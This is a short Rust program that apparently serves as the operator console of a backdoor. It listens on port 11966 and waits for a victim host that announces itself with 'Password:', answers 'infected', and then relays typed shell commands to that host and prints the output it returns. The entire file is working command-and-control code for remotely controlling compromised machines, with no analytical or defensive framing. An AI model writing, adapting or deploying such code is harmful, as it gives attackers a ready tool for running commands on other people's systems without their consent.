use std::net::TcpListener;
use std::net::TcpStream;
use std::io::Write;
use std::io::Read;
use std::io::stdout;

fn handle_client(mut stream: TcpStream) {
    println!("{}", stream.peer_addr().unwrap());
    let mut buf = [0; 1024];
    let len = stream.read(&mut buf).unwrap();
    let input = String::from_utf8(buf[..len].to_vec())
        .unwrap()
        .trim()
        .to_string();

    if !input.contains("Password:") {
        return
    }

    stream.write(b"infected").unwrap();
    loop {
        print!("> ");
        stdout().flush().unwrap();

        let mut cmd = String::new();
        std::io::stdin().read_line(&mut cmd).unwrap();
        cmd = cmd.trim().to_string();
        if cmd == "" {
            continue;
        }
        stream.write(cmd.trim().as_bytes()).unwrap();
        
        let mut buf = [0; 100000];
        let len = stream.read(&mut buf).unwrap();
        let output = String::from_utf8(buf[..len].to_vec())
            .unwrap()
            .trim()
            .to_string();
        if output == "EXIT" {
            break;
        }
        println!("{}", output);
    }
}

fn main() -> std::io::Result<()> {
    let listener = TcpListener::bind("0.0.0.0:11966").unwrap();
    println!("Waiting for connection...");
    for stream in listener.incoming() {
        handle_client(stream?);
        println!("Waiting for connection...");
    }

    Ok(())
}